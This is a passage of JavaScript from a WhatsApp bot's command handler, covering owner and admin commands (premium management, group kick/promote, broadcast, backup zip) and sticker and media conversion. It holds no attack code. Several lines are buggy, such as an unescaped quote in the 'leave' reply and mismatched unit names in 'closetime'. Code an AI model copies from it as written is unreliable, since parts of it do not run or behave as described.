    if (args.length < 1) return irisreply(`Use :\n*#delprem* @tag\n*#delprem* number`);
    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium));
        }
        irisreply("Delete success");
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium));
        irisreply("Success");
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'listprem':
    if (!isCreator) return irisreply(mess.owner);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
 
    let data = require("./lib/database/premium.json");
    let txt = `*------「 LIST PREMIUM 」------*\n\n`;
    for (let i of data) {
        txt += `Number : ${i.id}\n`;
        txt += `Expired : ${i.expired} Second\n`;
    }
    Venox.sendMessage(m.chat, {
        text: txt,
        mentions: i
    }, {
        quoted: m
    });
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'join':
    try {
        if (!isCreator) return irisreply(mess.owner);
	if (isBan) return irisreply(mess.banned);
        if (isBanChat) return irisreply(mess.bangc);
	Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
        if (!text) return irisreply('Enter Group Link!');
        if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return irisreply('Link Invalid!');
        irisreply(mess.wait);
        let result = args[0].split('https://chat.whatsapp.com/')[1];
        await Venox.groupAcceptInvite(result).then((res) => irisreply(json(res))).catch((err) => irisreply(json(err)));
    } catch (error) {
        irisreply('Failed to join the Group');
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'autoswview':
case 'autostatusview':
    {
        if (!isCreator) return irisreply(mess.owner);
	if (isBan) return irisreply(mess.banned);
        if (isBanChat) return irisreply(mess.bangc);
	Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
        if (args.length < 1) return irisreply('on/off?');
        if (args[0] === 'on') {
            global.autoswview = true;
            irisreply(`${command} is enabled`);
        } else if (args[0] === 'off') {
            global.autoswview = false;
            irisreply(`${command} is disabled`);
        }
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'autobio':
    {
        if (!isCreator) return irisreply(mess.owner);
	if (isBan) return irisreply(mess.banned);
        if (isBanChat) return irisreply(mess.bangc);
	Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
        if (args.length < 1) return irisreply(`Example ${prefix + command} on/off`);
        const status = args[0].toLowerCase();
        if (status === 'on') {
            autobio = true;
            irisreply(`Successfully Changed AutoBio To ${status}`);
        } else if (status === 'off') {
            autobio = false;
            irisreply(`Successfully Changed AutoBio To ${status}`);
        } else {
            irisreply('Invalid command. Use "on" or "off".');
        }
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'setexif': {
    if (!isCreator) return irisreply(mess.owner);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    if (!text) return irisreply(`Example : ${prefix + command} packname|author`);
    global.packname = text.split("|")[0];
    global.author = text.split("|")[1];
    irisreply(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`);
}
break;

//----------------------------------------------------------------------------------
	    
case 'setppbot':
{
    if (!isCreator) return irisreply(mess.owner);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
  
    if (!quoted) return irisreply(`Send/Reply Image With Caption ${prefix + command}`);
    if (!/image/.test(mime)) return irisreply(`Send/Reply Image With Caption ${prefix + command}`);
    if (/webp/.test(mime)) return irisreply(`Send/Reply Image With Caption ${prefix + command}`);
    var medis = await Venox.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');
    if (args[0] == 'full') {
        var {
            img
        } = await generateProfilePicture(medis);
        await Venox.query({
            tag: 'iq',
            attrs: {
                to: botNumber,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [{
                tag: 'picture',
                attrs: {
                    type: 'image'
                },
                content: img
            }]
        });
        fs.unlinkSync(medis);
        irisreply(mess.done);
    } else {
        var memeg = await Venox.updateProfilePicture(botNumber, {
            url: medis
        });
        fs.unlinkSync(medis);
        irisreply(mess.done);
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'block':
{
    if (!isCreator) return irisreply(mess.owner);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
    
    let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await Venox.updateBlockStatus(blockw, 'block').then((res) => irisreply(json(res))).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'unblock':
{
    if (!isCreator) return irisreply(mess.owner);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await Venox.updateBlockStatus(blockww, 'unblock').then((res) => irisreply(json(res))).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'leave': {
    if (!isCreator) return replygcxeon(mess.owner);
    if (!m.isGroup) return replygcxeon(mess.group);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    irisreply('Bye Everyone, i will miss y'all 🥺');
    await Venox.groupLeave(m.chat);
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'backup': {
    if (!isCreator) return irisreply(mess.owner);
    if (m.isGroup) return irisreply(mess.private);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    irisreply(mess.wait);
    exec('zip backup.zip *');
    let malas = await fs.readFileSync('./backup.zip');
    await Venox.sendMessage(m.chat, {
        document: malas,
        mimetype: 'application/zip',
        fileName: 'backup.zip'
    }, {
        quoted: m
    });
    break;
}
	    
//----------------------------------------------------------------------------------
	    
 case 'bcgroup': {
    if (!isCreator) return irisreply(mess.owner);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	 
    if (!text) return irisreply(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `);
    let getGroups = await Venox.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let anu = groups.map(v => v.id);
    irisreply(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`);
    for (let i of anu) {
        await sleep(1500);
        let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ';
        await Venox.sendMessage(i, {
            text: a,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'Broadcast By Owner',
                    body: `Sent ${i.length} Group`,
                    thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
                    sourceUrl: global.link,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
    }
    irisreply(`Successfully Sent Broadcast To ${anu.length} Group`);
    break;
}
	    
//----------------------------------------------------------------------------------
	    
case 'delete':
case 'del': {
    if (!isCreator) return irisreply(mess.done);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    if (!m.quoted) throw false;
    let { chat, fromMe, id, isBaileys } = m.quoted;
    if (!isBaileys) return irisreply('The message was not sent by a bot!');
    await Venox.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: true,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    });
    break;
}
	    
//----------------------------------------------------------------------------------
	    
case 'closetime':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let timer;
    if (args[1] == 'detik') {
        timer = args[0] * 1000;
    } else if (args[1] == 'menit') {
        timer = args[0] * 60000;
    } else if (args[1] == 'jam') {
        timer = args[0] * 3600000;
    } else if (args[1] == 'hari') {
        timer = args[0] * 86400000;
    } else {
        return irisreply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second');
    }

    irisreply(`Close time ${q} starting from now`);
    setTimeout(() => {
        const close = `*Closed* group closed by admin\nnow only admin can send messages`;
        Venox.groupSettingUpdate(m.chat, 'announcement');
        irisreply(close);
    }, timer);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'opentime':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let timer;
    if (args[1] == 'second') {
        timer = args[0] * 1000;
    } else if (args[1] == 'minute') {
        timer = args[0] * 60000;
    } else if (args[1] == 'hour') {
        timer = args[0] * 3600000;
    } else if (args[1] == 'day') {
        timer = args[0] * 86400000;
    } else {
        return irisreply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second');
    }

    irisreply(`Open time ${q} starting from now`);
    setTimeout(() => {
        const open = `*Opened* The group is opened by admin\nNow members can send messages`;
        Venox.groupSettingUpdate(m.chat, 'not_announcement');
        irisreply(open);
    }, timer);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'kick':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await Venox.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => irisreply(json(res))).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'add':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await Venox.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => irisreply(json(res))).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'promote':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await Venox.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => irisreply(json(res))).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'demote':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await Venox.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => irisreply(json(res))).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'setgcname':
case 'setsubject':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

	
    if (!text) return irisreply('Text ?');
    
    await Venox.groupUpdateSubject(m.chat, text).then((res) => irisreply(mess.success)).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'setdesc':
case 'setgcdesk':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });


    if (!text) return irisreply('Text ?');

    await Venox.groupUpdateDescription(m.chat, text).then((res) => irisreply(mess.success)).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'setgcpic':
case 'setppgc':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    if (!quoted) return irisreply(`Send/Reply Image With Caption ${prefix + command}`);
    if (!/image/.test(mime)) return irisreply(`Send/Reply Image With Caption ${prefix + command}`);
    if (/webp/.test(mime)) return irisreply(`Send/Reply Image With Caption ${prefix + command}`);
    var medis = await Venox.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');
    if (args[0] == 'full') {
        var { img } = await generateProfilePicture(medis);
        await Venox.query({
            tag: 'iq',
            attrs: {
                to: m.chat,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [{
                tag: 'picture',
                attrs: {
                    type: 'image'
                },
                content: img
            }]
        });
        fs.unlinkSync(medis);
        irisreply(mess.done);
    } else {
        var memeg = await Venox.updateProfilePicture(m.chat, {
            url: medis
        });
        fs.unlinkSync(medis);
        irisreply(mess.done);
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'tagall':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });


    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    let teks = `*🍀 Tag All 🍀*\n\n💬 *Message : ${q ? q : 'blank'}*\n\n`;
    for (let mem of participants) {
        teks += `• @${mem.id.split('@')[0]}\n`;
    }
    Venox.sendMessage(m.chat, {
        text: teks,
        mentions: participants.map(a => a.id)
    }, {
        quoted: m
    });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'hidetag':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    Venox.sendMessage(m.chat, {
        text: q ? q : '',
        mentions: participants.map(a => a.id)
    }, {
        quoted: m
    });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'totag':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (!isAdmins) return irisreply(mess.admin);
    if (!m.quoted) return irisreply(`Reply messages with captions ${prefix + command}`);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    Venox.sendMessage(m.chat, {
        forward: m.quoted.fakeObj,
        mentions: participants.map(a => a.id)
    });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'group':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    if (args[0] === 'close') {
        await Venox.groupSettingUpdate(m.chat, 'announcement').then((res) => irisreply(`Success In Closing The Group 🕊️`)).catch((err) => irisreply(json(err)));
    } else if (args[0] === 'open') {
        await Venox.groupSettingUpdate(m.chat, 'not_announcement').then((res) => irisreply(`Success In Opening The Group 🕊️`)).catch((err) => irisreply(json(err)));
    } else {
        irisreply(`Mode ${command}\n\n\nType ${prefix + command}open/close`);
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'editinfo':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    if (args[0] === 'open') {
        await Venox.groupSettingUpdate(m.chat, 'unlocked').then((res) => irisreply(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => irisreply(json(err)));
    } else if (args[0] === 'close') {
        await Venox.groupSettingUpdate(m.chat, 'locked').then((res) => irisreply(`Successfully Closed Group Edit Info 🕊️`)).catch((err) => irisreply(json(err)));
    } else {
        irisreply(`Mode ${command}\n\n\nType ${prefix + command}on/off`);
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'linkgroup':
case 'grouplink':
case 'linkgc':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let response = await Venox.groupInviteCode(m.chat);
    let groupMetadata = await Venox.groupMetadata(m.chat);
    Venox.sendText(m.chat, `👥 *GROUP LINK INFO*\n🌈 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
        detectLink: true
    });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'revoke':
case 'resetlink':
{
    if (!m.isGroup) return irisreply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return irisreply(mess.admin);
    if (!isBotAdmins) return irisreply(mess.botAdmin);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    await Venox.groupRevokeInvite(m.chat)
        .then(res => {
            irisreply(`Successful Reset, Group Invite Link ${groupMetadata.subject}`);
        }).catch((err) => irisreply(json(err)));
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'ping':
{
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let pingga = `_Pong ${latensie.toFixed(4)} ms_`
    Venox.sendMessage(m.chat, {
        image: fs.readFileSync('./lib/media/thumb.jpg'),
        caption: pingga,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: `${global.botname}`,
                sourceUrl: `${global.link}`,
                body: `Bot Created By ${global.owner}`
            }
        }
    }, {
        quoted: m
    });
    break;
}
	    
//----------------------------------------------------------------------------------
	    
case 'runtime': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`;

    Venox.sendMessage(m.chat, {
        text: runtimetext,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${global.botname}`,
                body: `Yo 🍀 Whatsapp`,
                thumbnailUrl: 'https://i.ibb.co/2Fxnv8W/bot2.jpg',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });
    break;
}
	    
//----------------------------------------------------------------------------------
	    
case 'owner': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    const repf = await Venox.sendMessage(from, {
        contacts: {
            displayName: `${list.length} Contact`,
            contacts: list
        },
        mentions: [sender]
    }, {
        quoted: m
    });

    Venox.sendMessage(from, {
        text: `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`,
        mentions: [sender]
    }, {
        quoted: repf
    });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'sticker':
case 'stiker':
case 's': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    if (!quoted) return irisreply(`Reply to Video/Image With Caption ${prefix + command}`);
    if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await Venox.sendImageAsSticker(m.chat, media, m, {
            packname: packname,
            author: author
        });
        await fs.unlinkSync(encmedia);
    } else if (isVideo || /video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return irisreply('Maximum 10 seconds!');
        let media = await quoted.download();
        let encmedia = await Venox.sendVideoAsSticker(m.chat, media, m, {
            packname: packname,
            author: author
        });
        await fs.unlinkSync(encmedia);
    } else {
        return irisreply(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`);
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'smeme': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`;
    if (!/image/.test(mime)) return irisreply(respond);
    if (!text) return irisreply(respond);
    irisreply(mess.wait);
    atas = text.split('|')[0] ? text.split('|')[0] : '-';
    bawah = text.split('|')[1] ? text.split('|')[1] : '-';
    let dwnld = await Venox.downloadAndSaveMediaMessage(qmsg);
    let fatGans = await TelegraPh(dwnld);
    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`;
    let pop = await Venox.sendImageAsSticker(m.chat, smeme, m, {
        packname: packname,
        author: author
    });
    fs.unlinkSync(pop);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'swm': 
case 'steal': 
case 'stickerwm': 
case 'take': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    if (!args.join(" ")) return irisreply(`Where is the text?`);
    const swn = args.join(" ");
    const pcknm = swn.split("|")[0];
    const atnm = swn.split("|")[1];
    if (m.quoted.isAnimated === true) {
        await Venox.downloadAndSaveMediaMessage(quoted, "gifee");
        Venox.sendMessage(from, { sticker: fs.readFileSync("gifee.webp") }, { quoted: m });
    } else if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await Venox.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm });
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return irisreply('Maximum 10 Seconds!');
        let media = await quoted.download();
        let encmedia = await Venox.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm });
    } else {
        irisreply(`Photo/Video?`);
    }
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'toimage':
case 'toimg': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    if (!/webp/.test(mime)) return irisreply(`Reply sticker with caption *${prefix + command}*`);
    irisreply(mess.wait);
    let media = await Venox.downloadAndSaveMediaMessage(qmsg);
    let ran = await getRandom('.png');
    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
        fs.unlinkSync(media);
        if (err) return err;
        let buffer = fs.readFileSync(ran);
        Venox.sendMessage(m.chat, { image: buffer }, { quoted: m });
        fs.unlinkSync(ran);
    });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'tomp4':
case 'tovideo': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    if (!/webp/.test(mime)) return irisreply(`Reply sticker with caption *${prefix + command}*`);
    irisreply(mess.wait);
    let media = await Venox.downloadAndSaveMediaMessage(qmsg);
    let webpToMp4 = await webp2mp4File(media);
    await Venox.sendMessage(m.chat, {
        video: {
            url: webpToMp4.result,
            caption: 'Convert Webp To Video'
        }
    }, {
        quoted: m
    });
    await fs.unlinkSync(media);
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'toaud':
case 'toaudio': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    if (!/video/.test(mime) && !/audio/.test(mime)) return irisreply(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`);
    irisreply(mess.wait);
    let media = await Venox.downloadMediaMessage(qmsg);
    let audio = await toAudio(media, 'mp4');
    Venox.sendMessage(m.chat, {
        audio: audio,
        mimetype: 'audio/mpeg'
    }, {
        quoted: m
    });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'tomp3': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    if (!/video/.test(mime) && !/audio/.test(mime)) return irisreply(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`);
    irisreply(mess.wait);
    let media = await Venox.downloadMediaMessage(qmsg);
    let audio = await toAudio(media, 'mp4');
    Venox.sendMessage(m.chat, {
        document: audio,
        mimetype: 'audio/mp3',
        fileName: `dio.mp3`
    }, {
        quoted: m
    });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'alive': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });

    const alivemessage = global.alivemsg || `*ᴀ ʙᴀɪʟᴇʏs ʙᴀsᴇᴅ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ 🌈*`;
    const alivetext = `
    ʜᴇʟʟᴏ, ${pushname}..! 🍀
    ɪ ᴀᴍ  ${BotName}
    
    _${alivemessage}_
    
    *ɪʀɪs ᴍᴅ 2.0.9*
    `;

    const alivemessageObj = {
        image: {
            url: `https://i.ibb.co/mHZfGhg/venoxsenpai.png`,
        },
        caption: alivetext,
        footer: global.wm,
        headerType: 4,
    };

    Venox.sendMessage(m.chat, alivemessageObj, {
        quoted: myreply,
    });

    break;
}
	    
//----------------------------------------------------------------------------------
	    
case 'buypremium': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
	
    let msg = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`;
    await Venox.sendMessage(m.chat, { text: msg, contextInfo: { externalAdReply: { showAdAttribution: true, title: `global.botname`, body: `global.ownername`, thumbnailUrl: 'https://i.ibb.co/Z65xq3Z/buyprem.png', sourceUrl: global.link, mediaType: 1, renderLargerThumbnail: true } } }, { quoted: m });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'tovn':
case 'toptt': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '⛩️', key: m.key } });
    if (!/video/.test(mime) && !/audio/.test(mime)) return irisreply(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`);
    irisreply(mess.wait);
    let media = await Venox.downloadMediaMessage(qmsg);
    let { toPTT } = require('./lib/converter');
    let audio = await toPTT(media, 'mp4');
    Venox.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;
	    
//----------------------------------------------------------------------------------
	    
case 'togif': {
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
